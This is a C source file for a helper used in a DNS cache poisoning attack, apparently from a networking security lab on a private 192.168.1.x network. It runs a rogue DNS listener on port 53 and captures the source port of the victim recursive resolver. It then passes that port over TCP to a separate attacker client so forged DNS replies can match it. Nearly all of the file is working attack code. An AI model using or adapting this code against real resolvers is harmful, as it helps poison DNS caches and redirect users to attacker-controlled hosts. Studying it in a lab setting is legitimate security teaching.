#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <unistd.h>

#define DATABASE 192, 168, 1, 204
#define WEB_SERVER 192, 168, 1, 203
#define ATTACKER_SERVER_ADDR 192, 168, 1, 201
#define ATTACKER_CLIENT_ADDR 192, 168, 1, 202

union address {
    uint8_t fields[4];
    uint32_t l;
};

enum {
    WIRE_LEN = 4096,
    IP_ID = 0x1222,
    CLIENT_PORT = 12345,
    ATTACKER_SERVER_PORT = 34567,
};

void _bind(const int32_t sockfd, const uint8_t field0, const uint8_t field1,
           const uint8_t field2, const uint8_t field3, const uint16_t port) {
    struct sockaddr_in addr_in = {0};

    addr_in.sin_family = AF_INET;
    const union address address = {{field0, field1, field2, field3}};
    addr_in.sin_addr.s_addr = address.l;

    addr_in.sin_port = htons(port);

    if (bind(sockfd, (struct sockaddr *) &addr_in, sizeof(addr_in)) < 0) {
#ifdef __MY_DEBUG__
        perror("bind failed...\n");
#endif
        close(sockfd);
        exit(1);
    }
}

void _sendto(const int32_t sockfd, const void *const buff, size_t buff_size,
             const uint8_t field0, const uint8_t field1,
             const uint8_t field2, const uint8_t field3, const uint16_t port) {
    struct sockaddr_in addr_in = {0};

    addr_in.sin_family = AF_INET;
    const union address address = {{field0, field1, field2, field3}};
    addr_in.sin_addr.s_addr = address.l;

    addr_in.sin_port = htons(port);

    if (sendto(sockfd, buff, buff_size, 0, (struct sockaddr *) &addr_in, sizeof(addr_in)) < 0) {
#ifdef __MY_DEBUG__
        printf("sendto failed...\n");
#endif
        close(sockfd);
        exit(1);
    }
}

void reuse(const int32_t sockfd) {
    int opt = 1;
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt,
                   sizeof(opt)) < 0) {
#ifdef __MY_DEBUG__
        printf("setsockopt(SO_REUSEADDR) failed...\n");
#endif
        close(sockfd);
        exit(1);
    }
    opt = 1;
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEPORT, &opt,
                   sizeof(opt)) < 0) {
#ifdef __MY_DEBUG__
        printf("setsockopt(SO_REUSEPORT) failed...\n");
#endif
        close(sockfd);
        exit(1);
    }
}

/**
 *
 * @return The outgoing recursive sender port.
 */
uint16_t get_port() {
    const int32_t sock = socket(AF_INET, SOCK_DGRAM, 0);
    _bind(sock, ATTACKER_SERVER_ADDR, 53);
    char buff[1024];

    struct sockaddr_in addr_in;
    socklen_t addr_len = sizeof(addr_in);

    if (0 > recvfrom(sock, buff, sizeof(buff), 0, (struct sockaddr *)&addr_in, &addr_len)) {
#ifdef __MY_DEBUG__
        perror("Receiving request failed...\n");
#endif
        close(sock);
        exit(1);
    }

    close(sock);

    return addr_in.sin_port;
}

/**
 * Waits for the attacker client to connect, receives a query from the
 * recursive resolver, then sends its outgoing port to the client.
 */
void send_port() {
    const int32_t sock = socket(AF_INET, SOCK_STREAM, 0);
    reuse(sock);
    _bind(sock, ATTACKER_SERVER_ADDR, ATTACKER_SERVER_PORT);
    listen(sock, 5);

    struct sockaddr_in addr_in;
    socklen_t addr_len = sizeof(addr_in);
    const int32_t client = accept(sock, (struct sockaddr *)&addr_in, &addr_len);
    if (0 > client) {
#ifdef __MY_DEBUG__
        perror("Accepting failed...\n");
#endif
        close(sock);
        exit(1);
    }

    uint16_t port = get_port();

    if (0 > send(client, &port, sizeof(port), 0)) {
#ifdef __MY_DEBUG__
        perror("Sending failed...\n");
#endif
        close(client);
        close(sock);
        exit(1);
    }
    close(client);
    close(sock);
}

int main() {
    send_port();

    return 0;
}
